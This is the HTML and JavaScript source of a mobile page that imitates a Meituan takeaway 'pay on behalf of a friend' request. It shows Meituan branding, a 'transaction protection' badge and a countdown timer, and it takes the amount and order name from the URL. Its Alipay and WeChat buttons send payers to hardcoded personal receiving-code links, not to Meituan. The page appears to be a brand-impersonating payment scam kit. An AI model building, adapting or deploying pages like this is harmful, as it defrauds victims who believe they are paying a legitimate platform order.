<!doctype html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>好友代付 - 外卖订单</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
        .card { background: #fff; border-radius: 12px; padding: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); text-align: center; }
        .timer-box { background: #fffde7; border: 1px solid #ffe082; padding: 10px; border-radius: 8px; margin: 15px 0; }
        .btn { width: 100%; padding: 14px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
        .btn-primary { background: #ffd000; color: #333; }
        .btn-green { background: #07c160; color: #fff; }
        .btn-secondary { background: #f0f0f0; color: #666; }
        .menu-list { text-align: left; margin: 20px 0; border-top: 1px solid #eee; padding-top: 10px; font-size: 15px; }
    </style>
</head>
<body>

<div id="pay-view">
    <div class="card">
        <div style="font-weight:bold; margin-bottom:10px;">美团外卖 | 交易保障</div>
        <div style="font-size: 18px; margin-bottom: 10px;">Hi, 你和我的距离只差一顿外卖~</div>
        
        <div style="background:#ffeb3b; padding:20px; border-radius:12px;">
            <div style="font-size: 20px; font-weight: bold;">来帮我代付吧 ~</div>
            <div class="timer-box">
                剩余支付时间 <br> <span id="countdown" style="font-size: 24px; font-weight: bold;">14:59</span>
            </div>
        </div>

        <div class="menu-list">
            <p>需付款: <strong style="font-size: 24px;">¥<span id="display-amount">0.00</span></strong></p>
            <p>备注: <span id="display-name">外卖订单</span></p>
        </div>

        <button class="btn btn-primary" onclick="wakeUpAlipay()">支付宝支付</button>
        <button class="btn btn-green" onclick="wakeUpWechat()">微信支付</button>
        <button class="btn btn-secondary" onclick="finishPayment()">已完成支付，点击返回</button>
    </div>
</div>

<script>
    // 配置你的支付连接
    const ALIPAY_QR_URL = "https://qr.alipay.com/2m612342txzv1x1aorosqa0";
    const WECHAT_URL = "wxp://f2f07AWx-sG678z4zmpyiIjVJgl0raLlDk-BHza47alK-bI";

    // 1. 倒计时逻辑
    function startTimer(duration) {
        let timer = duration;
        const interval = setInterval(() => {
            let m = Math.floor(timer / 60);
            let s = timer % 60;
            document.getElementById('countdown').textContent = (m < 10 ? "0"+m : m) + ":" + (s < 10 ? "0"+s : s);
            if (--timer < 0) { clearInterval(interval); alert("支付超时"); }
        }, 1000);
    }

    // 2. 初始化：直接从 URL 读取参数
    const params = new URLSearchParams(window.location.search);
    const amount = params.get('amount') || "0.00";
    const orderId = params.get('orderId'); // 获取订单ID以便后续标记
    const name = params.get('name') || "外卖订单";

    document.getElementById('display-amount').innerText = amount;
    document.getElementById('display-name').innerText = decodeURIComponent(name);
    startTimer(899);

    // 3. 唤起支付
    function wakeUpAlipay() { window.location.href = `alipays://platformapi/startapp?saId=10000007&qrcode=${encodeURIComponent(ALIPAY_QR_URL)}`; }
    function wakeUpWechat() { window.location.href = WECHAT_URL; }

    // 4. 支付完成后返回
    function finishPayment() {
        if(confirm("确定已经完成支付了吗？")) {
            window.location.href = "index.html"; 
        }
    }
</script>
</body>
</html>
